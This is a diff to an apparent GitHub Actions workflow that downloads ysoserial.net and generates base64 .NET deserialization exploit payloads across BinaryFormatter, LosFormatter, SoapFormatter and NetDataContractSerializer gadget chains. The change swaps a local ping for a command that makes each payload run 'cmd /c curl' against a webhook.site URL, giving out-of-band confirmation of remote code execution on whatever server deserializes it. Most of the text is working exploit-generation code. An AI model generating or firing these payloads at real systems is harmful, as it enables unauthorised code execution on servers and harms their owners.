@@ -9,17 +9,25 @@ jobs:
         run: |
           curl -L -o yso.zip https://github.com/pwntester/ysoserial.net/releases/download/v1.36/ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9.zip
           Expand-Archive yso.zip -DestinationPath yso
-      - name: Generate payloads
+      - name: Generate OOB payloads
         shell: pwsh
         run: |
           $exe = "yso\Release\ysoserial.exe"
-          $cmd = "cmd /c ping -n 11 127.0.0.1"
           $jobs = @(
-            @("SoapFormatter","WindowsIdentity"),
-            @("SoapFormatter","ClaimsIdentity"),
-            @("SoapFormatter","PSObject"),
-            @("LosFormatter","TextFormattingRunProperties"),
-            @("BinaryFormatter","PSObject"),
-            @("BinaryFormatter","ClaimsIdentity")
+            @("BinaryFormatter","TypeConfuseDelegate","bftcd"),
+            @("LosFormatter","TypeConfuseDelegate","lostcd"),
+            @("NetDataContractSerializer","TypeConfuseDelegate","ndcstcd"),
+            @("BinaryFormatter","WindowsIdentity","bfwi"),
+            @("SoapFormatter","WindowsIdentity","soapwi"),
+            @("SoapFormatter","ClaimsIdentity","soapci"),
+            @("SoapFormatter","PSObject","soapps"),
+            @("LosFormatter","TextFormattingRunProperties","lostfrp"),
+            @("BinaryFormatter","PSObject","bfps"),
+            @("BinaryFormatter","ClaimsIdentity","bfci")
           )
-          foreach ($j in $jobs) { "===== $($j[0]) / $($j[1]) ====="; & $exe -f $j[0] -g $j[1] -c $cmd -o base64; "" }
+          foreach ($j in $jobs) {
+            $cmd = "cmd /c curl -s https://webhook.site/fe5dd2ab-e062-4a33-897c-d54c2b3b1b8d/" + $j[2]
+            "===== $($j[0]) / $($j[1]) ====="
+            & $exe -f $j[0] -g $j[1] -c $cmd -o base64
+            ""
+          }
